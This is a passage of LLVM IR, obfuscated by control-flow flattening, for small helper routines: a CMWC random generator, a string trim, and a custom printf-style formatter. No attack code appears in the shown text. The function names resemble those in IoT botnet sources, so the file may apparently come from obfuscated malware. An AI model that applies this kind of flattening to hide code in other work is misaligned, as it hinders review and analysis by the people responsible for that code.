  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 99111708, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 99111708, label %first
    i32 -1933978458, label %30
    i32 -1970348742, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1933978458, i32 -1970348742
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -1970348742, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1824225733, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1824225733, label %10
    i32 1660334287, label %20
    i32 1314288340, label %23
    i32 -745300401, label %24
    i32 -1690769864, label %29
    i32 -1005087650, label %38
    i32 384272424, label %40
    i32 -1750157643, label %43
    i32 -1917208380, label %45
    i32 -943419697, label %50
    i32 -66747937, label %62
    i32 -1815988351, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1660334287, i32 1314288340
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 1824225733, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -745300401, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -1690769864, i32 -1005087650
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 -1005087650, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 384272424, i32 -1750157643
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -745300401, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -1917208380, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 -943419697, i32 -1815988351
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -66747937, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -1917208380, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 758707723, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 758707723, label %12
    i32 838448994, label %18
    i32 -88808587, label %24
    i32 1423473938, label %32
    i32 -1890724465, label %33
    i32 -536998806, label %39
    i32 -530399610, label %40
    i32 -72272339, label %46
    i32 -699111744, label %49
    i32 1464645587, label %50
    i32 574656785, label %56
    i32 1937894398, label %61
    i32 1126330101, label %62
    i32 -1945527674, label %68
    i32 -1168020324, label %73
    i32 -1427425814, label %75
    i32 282234928, label %84
    i32 781125413, label %87
    i32 -1768373246, label %93
    i32 627729791, label %99
    i32 1520401544, label %105
    i32 -1508948833, label %110
    i32 -77176624, label %118
    i32 -2137852749, label %120
    i32 275482089, label %121
    i32 1049617605, label %127
    i32 -1290612568, label %133
    i32 191155530, label %140
    i32 -93924649, label %146
    i32 856474697, label %151
    i32 1226751147, label %158
    i32 -168253061, label %164
    i32 -1015346162, label %171
    i32 423495398, label %177
    i32 894203034, label %182
    i32 -658653643, label %189
    i32 -373781766, label %195
    i32 1654375830, label %202
    i32 1307910870, label %208
    i32 -1114198978, label %213
    i32 -897293924, label %220
    i32 -1335071935, label %226
    i32 2110781268, label %233
    i32 443397322, label %239
    i32 365009222, label %244
    i32 919784868, label %251
    i32 -1650774188, label %257
    i32 1766370016, label %263
    i32 2028984770, label %269
    i32 -472179777, label %274
    i32 -1117462462, label %286
    i32 1365034523, label %287
    i32 -1240201101, label %288
    i32 1812075268, label %295
    i32 460177187, label %296
    i32 -597409233, label %299
    i32 -225307517, label %303
    i32 1631030309, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 838448994, i32 -597409233
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -88808587, i32 1365034523
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 1423473938, i32 -1890724465
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -597409233, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -536998806, i32 -530399610
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1240201101, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -72272339, i32 -699111744
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -699111744, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 1464645587, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 574656785, i32 1937894398
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 1464645587, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 1126330101, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -1945527674, i32 -1168020324
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -1168020324, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -1427425814, i32 781125413
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 282234928, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 1126330101, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -1768373246, i32 1049617605
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 627729791, i32 1520401544
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1508948833, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1508948833, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -77176624, i32 -2137852749
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 275482089, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 275482089, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -1290612568, i32 1226751147
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 191155530, i32 -93924649
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 856474697, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 856474697, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -168253061, i32 -658653643
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 -1015346162, i32 423495398
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 894203034, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 894203034, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -373781766, i32 -897293924
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 1654375830, i32 1307910870
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -1114198978, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -1114198978, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 460177187, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -1335071935, i32 919784868
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 2110781268, i32 443397322
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
